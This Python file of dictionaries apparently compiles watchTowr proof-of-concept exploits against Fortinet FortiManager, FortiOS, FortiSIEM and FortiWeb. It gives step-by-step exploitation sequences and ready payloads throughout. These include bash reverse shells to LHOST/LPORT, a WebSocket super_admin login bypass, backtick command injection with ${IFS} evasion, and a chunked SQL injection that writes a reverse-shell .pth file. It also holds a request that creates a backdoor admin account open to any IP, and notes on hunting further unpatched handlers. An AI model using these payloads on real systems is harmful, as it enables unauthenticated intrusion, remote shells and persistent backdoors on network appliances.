"""
Fortinet watchTowr research PoC RE: CVE-2024-47575, CVE-2024-55591, CVE-2025-25256, CVE-2025-25257,
FortiWeb auth bypass (CVE-2025-64446 full exploitation)
Sources:
  - watchtowr-research/Fortijump-Exploit-CVE-2024-47575/CVE-2024-47575.py
  - watchtowr-research/fortios-auth-bypass-poc-CVE-2024-55591/CVE-2024-55591-PoC.py
  - watchtowr-research/watchTowr-vs-FortiSIEM-CVE-2025-25256/watchTowr-vs-FortiSIEM-CVE-2025-25256.py
  - watchtowr-research/watchTowr-vs-FortiWeb-CVE-2025-25257/watchTowr-vs-FortiWeb-CVE-2025-25257.py
  - watchtowr-research/watchTowr-vs-Fortiweb-AuthBypass/watchTowr-vs-Fortiweb-AuthBypass.py
Products: FortiManager, FortiOS, FortiSIEM, FortiWeb
"""

# ---------------------------------------------------------
# CVE-2024-47575: FortiJump -- complete FGFM exploitation sequence (watchTowr)
# ---------------------------------------------------------
CVE_2024_47575_WATCHTOWR = {
    "cve":      "CVE-2024-47575",
    "product":  "Fortinet FortiManager -- FGFM protocol port 541 (FortiJump)",
    "cvss":     "9.8 (Critical)",
    "source":   "watchtowr-research/Fortijump-Exploit-CVE-2024-47575/CVE-2024-47575.py",
    "cert":     "w00t_cert.bin + w00t_key.bin (fake Fortinet-format TLS client cert bundled in repo)",
}

CVE_2024_47575_PROTOCOL_SEQUENCE = {
    "fgfm_framing": (
        "sendmsg(socket, request): "
        "  header = struct.pack('>II', 0x36e01100, len(request)+8). "
        "  0x36e01100: big-endian magic (compare: CVE-2024-23113 format string uses LE 0x0001e034). "
        "  Different magic values indicate different FGFM protocol command paths. "
        "  Send: header + request. "
        "  Receive: discard 8 bytes -> read 8 bytes -> unpack('>II') -> (magic, size) -> read size bytes. "
        "  The server response has a 16-byte header (first 8 bytes discarded by PoC)."
    ),

    "exploitation_sequence": (
        "Step 1: get ip "
        "  - serialno=FGVMEVWG8YMT3R63 (hardcoded fake; any serial in FGxxx format accepted) "
        "  - platform=FortiGate-VM64, fos_ver=700, minor=2, patch=2, build=1255 "
        "  - Note: different build in get_ip (1255) vs get_auth (1396). "
        "Step 2: get auth "
        "  - Same serialno; platform=FortiGate-60E (PHYSICAL device; not VM) "
        "  - build=1396, branch=1396 -- different build implies different code path. "
        "Step 3: get file_exchange "
        "  - localid=random 3-digit int "
        "  - deflate=gzip, file_exch_cmd=put_json_cmd "
        "  - Server returns: remoteid=<value>. remoteid present = VULNERABLE. "
        "Step 4: channel (open) "
        "  - remoteid from Step 3 "
        "  - Payload: length\\n + JSON-RPC + '0\\n'. "
        "Step 5: channel (close) "
        "  - remoteid from Step 3 + action=close."
    ),

    "rce_payload": (
        "JSON-RPC via channel: "
        "  {\"method\": \"exec\", \"id\": 1, \"params\": [{\"url\": \"um/som/export\", "
        "   \"data\": {\"file\": \"`sh -i >& /dev/tcp/LHOST/LPORT 0>&1`\"}}]}. "
        "The backtick in the 'file' parameter is passed to a shell command without sanitization. "
        "Bash reverse shell executes with FortiManager service privileges."
    ),

    "detection_primitive": (
        "Vulnerability check: Step 3 (get file_exchange) response contains remoteid line. "
        "Patched target: Step 3 returns no remoteid (auth rejected before file exchange). "
        "The check mode exits after Step 3 without sending the payload."
    ),

    "re_insight": (
        "The watchTowr PoC reveals the complete 5-step FGFM exploitation sequence. "
        "Key insight: two different serialno/platform combinations are used for get_ip vs get_auth. "
        "The get_ip uses FortiGate-VM64 (virtual) and get_auth uses FortiGate-60E (physical). "
        "This suggests the FGFM protocol has separate handling paths for device type -- "
        "fdssvrd may use the platform field from get_auth to decide registration policy. "
        "The FortiGate-60E in get_auth may bypass a check that FortiGate-VM64 would fail. "
        "Ablation semantic sweep for fdssvrd: find platform-type conditional in the auth handler; "
        "query: 'function that branches on platform string to select registration policy'."
    ),
}


# ---------------------------------------------------------
# CVE-2024-55591 (GIANTYELLOWDUCK): watchTowr full PoC details
# ---------------------------------------------------------
CVE_2024_55591_WATCHTOWR = {
    "cve":      "CVE-2024-55591",
    "product":  "Fortinet FortiOS -- WebSocket CLI bypass (GIANTYELLOWDUCK)",
    "cvss":     "9.8 (Critical)",
    "source":   "watchtowr-research/fortios-auth-bypass-poc-CVE-2024-55591/CVE-2024-55591-PoC.py",
}

CVE_2024_55591_MECHANICS_WATCHTOWR = {
    "detection": (
        "pre_flight_checks(): "
        "  GET /service-worker.js?local_access_token=watchTowr. "
        "  If 'api/v2/static' in response.text -> VULNERABLE. "
        "  The local_access_token parameter value is irrelevant ('watchTowr' is hardcoded). "
        "  The service-worker.js endpoint returns a different response when local_access_token "
        "  parameter is present on a vulnerable build -- the bypass is triggered at parameter presence, "
        "  not at any specific token value."
    ),

    "websocket_upgrade": (
        "GET /ws/cli/open?cols=162&rows=100&local_access_token=watchTowr HTTP/1.1 "
        "  Upgrade: websocket "
        "  Connection: Upgrade "
        "  Sec-WebSocket-Key: {base64(random 16 bytes)} "
        "  Sec-WebSocket-Version: 13 "
        "The local_access_token parameter on the WebSocket URL is the bypass parameter. "
        "Any non-empty value works -- the presence of the parameter is the trigger."
    ),

    "login_message_format": (
        "WebSocket frame (opcode 0x81 = text): "
        "'\"admin\" \"admin\" \"watchTowr\" \"super_admin\" \"watchTowr\" \"watchTowr\" "
        "[13.37.13.37]:1337 [13.37.13.37]:1337\\r\\n'. "
        "7 space-separated fields: username, role, source_identifier, group, extra, extra, ip:port ip:port. "
        "super_admin group assignment provides full CLI access -- no privilege escalation needed. "
        "The source IP (13.37.13.37) does not need to match the actual connection IP."
    ),

    "command_injection": (
        "After login message: '\\r\\n{command}\\r\\n'. "
        "The command is a FortiOS CLI command (e.g., 'get system status'). "
        "The PoC loops sending login + command in a while True until meaningful response received. "
        "brute_force=True until non-empty payload received, then continues listening only."
    ),

    "re_insight": (
        "The login message exposes the FortiOS WebSocket CLI authentication format. "
        "The 7-field format includes: username, role, source string, group, additional context x2, "
        "and IP:port pairs. FortiOS trusts all these fields without verification "
        "when local_access_token is present. "
        "The super_admin group is the key field -- any other group would reduce privileges. "
        "Ablation semantic sweep: find the WebSocket CLI auth handler in httpsd; "
        "query: 'function that parses space-separated login context from WebSocket frame; "
        "assigns group membership without validation when local_access_token parameter is present'."
    ),
}


# ---------------------------------------------------------
# CVE-2025-25256: FortiSIEM archive_nfs_archive_dir backtick injection (watchTowr)
# ---------------------------------------------------------
CVE_2025_25256 = {
    "cve":      "CVE-2025-25256",
    "product":  "Fortinet FortiSIEM -- port 7900 NFS archive_nfs_archive_dir injection",
    "cvss":     "9.8 (Critical) -- unauthenticated RCE",
    "class":    "Command injection via XML field in port 7900 protocol (4th CVE in series)",
    "endpoint": "TLS/TCP 7900 (FortiSIEM data service)",
    "source":   "watchtowr-research/watchTowr-vs-FortiSIEM-CVE-2025-25256/watchTowr-vs-FortiSIEM-CVE-2025-25256.py",
}

CVE_2025_25256_MECHANICS = {
    "protocol_header": (
        "Same 16-byte protocol as CVE-2023-34992/CVE-2024-23108 but command code DIFFERENT: "
        "  values = [90, len(payload), 1075724911, 0]. "
        "  Command code 90 (vs 81 in CVE-2023-34992 and CVE-2024-23108). "
        "  Magic constant 1075724911 (0x40240077): same across all 4 port-7900 CVEs. "
        "  struct.pack('<IIII', 90, len, 1075724911, 0)."
    ),

    "xml_injection_field": {
        "xml_template": (
            "<root>"
            "  <archive_storage_type>nfs</archive_storage_type>"
            "  <archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>"
            "  <archive_nfs_archive_dir>`{command}`</archive_nfs_archive_dir>"
            "  <scope>local</scope>"
            "</root>"
        ),
        "injection_point": "archive_nfs_archive_dir: backtick injection; server_ip set to 127.0.0.1 (not injected)",
        "space_bypass": "c = command.replace(' ', '${IFS}') before inserting into XML",
    },

    "patch_bypass_progression": {
        "CVE-2023-34992 (code 81)": "server_ip injection -- PATCHED",
        "CVE-2024-23108 (code 81)": "mount_point injection (same code, different field) -- PATCHED",
        "CVE-2025-64155 (code 156)": "elastic cluster_url injection (different storage type) -- PATCHED",
        "CVE-2025-25256 (code 90)": "archive_nfs_archive_dir injection (different command code + field) -- CURRENT",
    },

    "re_insight": (
        "CVE-2025-25256 introduces a new command code (90 vs prior 81) for the same port 7900 service. "
        "Fortinet patched the server_ip and mount_point fields in command 81, "
        "patched cluster_url in command 156, "
        "but command 90 (NFS archive configuration) has an entirely separate XML handler "
        "with the same unescaped backtick-in-shell-command pattern. "
        "Each command code dispatches to a different handler in the FortiSIEM service. "
        "Ablation semantic sweep: enumerate all command code handlers (81, 90, 156, and others) "
        "and check each handler's XML field processing for shell metacharacter sanitization. "
        "The pattern 'system(sprintf(format, xml_field))' should appear in multiple handlers -- "
        "only those receiving active patch attention have been fixed."
    ),
}


# ---------------------------------------------------------
# CVE-2025-25257: FortiWeb unauthenticated SQLi -> INTO OUTFILE -> Python .pth RCE
# ---------------------------------------------------------
CVE_2025_25257 = {
    "cve":      "CVE-2025-25257",
    "product":  "Fortinet FortiWeb -- /api/fabric/device/status Authorization Bearer SQLi",
    "cvss":     "9.8 (Critical) -- unauthenticated SQLi + RCE chain",
    "class":    "SQL injection in Authorization header -> INTO OUTFILE -> Python .pth persistence -> RCE",
    "endpoint": "GET /api/fabric/device/status (FortiWeb AI Fabric API; unauthenticated)",
    "source":   "watchtowr-research/watchTowr-vs-FortiWeb-CVE-2025-25257/watchTowr-vs-FortiWeb-CVE-2025-25257.py",
}

CVE_2025_25257_MECHANICS = {
    "sqli_injection_point": (
        "Authorization header value contains SQL injection: "
        "  Bearer '/**/;UPDATE/**/fabric_user.user_table/**/SET/**/token=UNHEX('{hex}');SELECT/**/'1' "
        "  or "
        "  Bearer '/**/;UPDATE/**/fabric_user.user_table/**/SET/**/token=CONCAT(token,UNHEX('{hex}'));SELECT/**/'1' "
        "The Bearer token is parsed by the FortiWeb API fabric layer and reflected into a SQL query "
        "without parameterization. "
        "SQL comment /**/ is used to replace spaces (avoids space-filtering)."
    ),

    "payload_construction": (
        "Python command: import os; os.system('bash -c \"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'). "
        "Hex encode: binascii.hexlify(command.encode()).decode(). "
        "Chunked UPDATE: chunk_size=10 hex chars (5 bytes per chunk). "
        "  Chunk 0: SET token=UNHEX('{chunk0}'). "
        "  Chunks 1-N: SET token=CONCAT(token, UNHEX('{chunkN}')). "
        "The entire Python command is assembled in fabric_user.user_table.token column "
        "across multiple sequential UPDATE requests (1 second sleep between chunks)."
    ),

    "outfile_rce": (
        "Final injection after payload assembly: "
        "  Bearer '/**/UNION/**/SELECT/**/token/**/from/**/fabric_user.user_table "
        "           /**/into/**/outfile/**/'../../lib/python3.10/site-packages/x.pth' "
        "  GET /api/fabric/device/status with this header. "
        "MySQL INTO OUTFILE writes the token column contents (the full Python command) "
        "to: ../../lib/python3.10/site-packages/x.pth "
        "This path is RELATIVE to the MySQL data directory. "
        "Absolute target: /lib/python3.10/site-packages/x.pth (on FortiWeb appliance)."
    ),

    "pth_rce_trigger": (
        "Python .pth files in site-packages are automatically imported when Python initializes. "
        "A .pth file containing Python code (import statement or executable) runs at Python startup. "
        "Trigger: HEAD /cgi-bin/ml-draw.py -- FortiWeb's machine learning CGI script (Python). "
        "When Python starts to execute ml-draw.py, it reads all .pth files in site-packages, "
        "executing x.pth which contains the reverse shell command. "
        "RCE achieved with FortiWeb's web server process privileges."
    ),

    "attack_steps": [
        "1. Build Python reverse shell command string",
        "2. Hex-encode the command",
        "3. Send N UPDATE requests (chunked UNHEX) to assemble payload in DB token column",
        "4. Send UNION SELECT ... INTO OUTFILE to write .pth file to site-packages",
        "5. HEAD /cgi-bin/ml-draw.py to trigger Python startup -> .pth import -> RCE",
    ],

    "version_specificity": (
        "INTO OUTFILE path: '../../lib/python3.10/site-packages/x.pth'. "
        "Python 3.10 is hardcoded -- different FortiWeb versions may use Python 3.9 or 3.11. "
        "Attacker must confirm Python version on target (e.g., via error response parsing "
        "or directory traversal) to pick the correct relative path."
    ),

    "re_insight": (
        "CVE-2025-25257 is a multi-stage chain: "
        "(1) No auth required -- the API fabric endpoint processes unauthenticated requests. "
        "(2) The chunked UPDATE approach works around length limits on individual SQL injections. "
        "(3) INTO OUTFILE for .pth persistence is an underused technique -- "
        "    most SQLi-to-RCE chains use UDF or direct command execution. "
        "    Writing to .pth avoids the need for FILE privilege on a command-exec path. "
        "(4) The ml-draw.py CGI is FortiWeb's AI/WAF feature -- it is a Python script "
        "    specifically because FortiWeb's machine learning stack runs in Python. "
        "    This CGI trigger is stable across FortiWeb versions with the AI feature. "
        "Ablation: locate the Authorization header parser in FortiWeb's API fabric service; "
        "find the SQL query construction that includes the Bearer token value without parameterization."
    ),
}


# ---------------------------------------------------------
# FortiWeb auth bypass full exploitation (watchTowr; CVE-2025-64446 admin user creation)
# ---------------------------------------------------------
CVE_2025_64446_FULL_EXPLOITATION = {
    "cve":      "CVE-2025-64446",
    "product":  "Fortinet FortiWeb -- /api/v2.0 to /cgi-bin/fwbcgi auth bypass + admin creation",
    "class":    "Path confusion auth bypass -> CGIINFO identity injection -> arbitrary admin user creation",
    "source":   "watchtowr-research/watchTowr-vs-Fortiweb-AuthBypass/watchTowr-vs-Fortiweb-AuthBypass.py",
    "note":     "Extends CVE_2025_64446_MECHANICS from fortinet_fortiweb_fortisiem_re.py",
}

CVE_2025_64446_ADMIN_CREATION = {
    "admin_creation_payload": (
        "POST /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi "
        "Headers: "
        "  CGIINFO: base64({\"username\": \"admin\", \"profname\": \"prof_admin\", "
        "                    \"vdom\": \"root\", \"loginname\": \"admin\"}) "
        "  Content-Type: application/x-www-form-urlencoded "
        "Body (JSON): "
        "  q_type=1 (CREATE operation) "
        "  name=<random 8-char UUID[:8]> "
        "  access-profile=prof_admin (admin access profile) "
        "  trusthostv4=0.0.0.0/0 (allow from any IP) "
        "  trusthostv6=::/0 (allow from any IPv6) "
        "  type=local-user "
        "  password=<same as name>. "
        "On 200 response: new admin user created with random name, same-as-name password, "
        "prof_admin privileges, and unrestricted access from any host. "
        "This is a persistent backdoor admin account."
    ),

    "cgiinfo_identity_claim": (
        "The CGIINFO header contains a base64-encoded JSON with admin identity: "
        "  {\"username\": \"admin\", \"profname\": \"prof_admin\", \"vdom\": \"root\", "
        "   \"loginname\": \"admin\"}. "
        "fwbcgi trusts this header as the authenticated user identity without validation. "
        "The API routing layer strips authentication and passes CGIINFO directly to the CGI. "
        "Any CGIINFO content is accepted -- the attacker fully controls the claimed identity."
    ),

    "q_type_operation_codes": (
        "q_type=1 = CREATE (used in watchTowr PoC). "
        "q_type values likely include: 1=create, 2=modify, 3=delete (not confirmed -- inferred from REST conventions). "
        "Ablation target: fwbcgi binary; find q_type parser in admin user management handler."
    ),
}


# ---------------------------------------------------------
# Systemic: FortiSIEM port 7900 injection family
# ---------------------------------------------------------
FORTISIEM_PORT7900_SYSTEMIC = {
    "id":       "FSIEM-PORT7900-SYSTEMIC",
    "product":  "FortiSIEM port 7900 service",
    "severity": "CRITICAL -- 4 CVEs; all unauthenticated RCE; all field-by-field patching",

    "cve_table": {
        "CVE-2023-34992 (code 81)": {
            "field":   "archive_nfs_server_ip",
            "type":    "NFS configuration",
            "status":  "PATCHED",
        },
        "CVE-2024-23108 (code 81)": {
            "field":   "mount_point",
            "type":    "NFS configuration (same command code as 34992)",
            "status":  "PATCHED",
        },
        "CVE-2025-64155 (code 156)": {
            "field":   "cluster_url",
            "type":    "Elasticsearch configuration",
            "status":  "PATCHED",
        },
        "CVE-2025-25256 (code 90)": {
            "field":   "archive_nfs_archive_dir",
            "type":    "NFS archive configuration",
            "status":  "CURRENT",
        },
    },

    "patch_pattern": (
        "Each patch adds input sanitization for a specific XML field in a specific command handler. "
        "The underlying vulnerability -- unescaped XML field values concatenated into shell commands -- "
        "is present in every command handler that processes external storage configuration. "
        "Fortinet patches the specific field that was exploited, leaving all other injectable fields "
        "in other command handlers unpatched. "
        "The port 7900 service should be treated as having an unknown number of injectable fields "
        "across all command codes. "
        "Ablation: binary search for all command code dispatch tables in the FortiSIEM port 7900 service; "
        "for each handler, find XML field -> shell command concatenation patterns. "
        "Query: 'function building shell command string from parsed XML field value'."
    ),
}
